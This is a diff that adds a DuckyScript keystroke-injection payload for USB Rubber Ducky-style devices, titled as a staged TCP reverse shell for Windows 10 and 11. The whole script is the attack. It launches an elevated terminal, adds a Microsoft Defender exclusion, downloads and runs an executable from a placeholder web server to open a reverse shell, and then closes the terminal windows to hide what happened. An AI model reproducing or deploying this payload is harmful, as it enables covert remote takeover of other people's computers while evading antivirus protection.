@@ -1,0 +1,53 @@
+REM       |=========================================================================|
+REM         Staged Interpreter TCP Reverse Ducky Shell
+REM         Author: DVBNL
+REM         Version 2.0
+REM         OS Tested: Windows 11, Windows 10
+REM         INTERPRETER STAGED REVERSE SHELL > executable
+REM         WORKS WITH NEWEST WINDOWS TERMINAL (wt.exe)
+REM         CHANGE >> LINE 23 - 28 VARIABLES + URL LINE 39
+REM       |=========================================================================|
+
+
+REM |===Start Windows Terminal as admin===|
+DELAY 2000
+GUI r
+DELAY 250
+STRING powershell "start-process wt -verb runas" 
+ENTER
+DELAY 2500
+LEFT
+ENTER
+DELAY 1000
+
+REM |===Import variables===|
+STRING $dir = "C:\temp" 
+ENTER
+STRING $shell = "C:\temp\shell.exe" 
+ENTER
+DELAY 250
+
+REM |===Add path exclusion MS Defender===|
+STRING Add-MpPreference -ExclusionPath $dir
+ENTER
+DELAY 750
+
+REM |===Download shell executable van Webserver===|
+STRING New-Item -Path $dir -ItemType Directory
+ENTER
+DELAY 350
+STRING Invoke-WebRequest -uri http://yourwebserver/payload.exe -outfile $shell
+ENTER
+DELAY 750
+
+REM |===Run .exe and set up Staged TCP reverse shell===|
+STRING start $shell
+ENTER
+DELAY 750
+
+REM |===Kill all active wt or powershell processes (Visibility)===|
+STRING Stop-Process -name powershell
+ENTER
+DELAY 500
+STRING Stop-Process -name WindowsTerminal
+ENTER
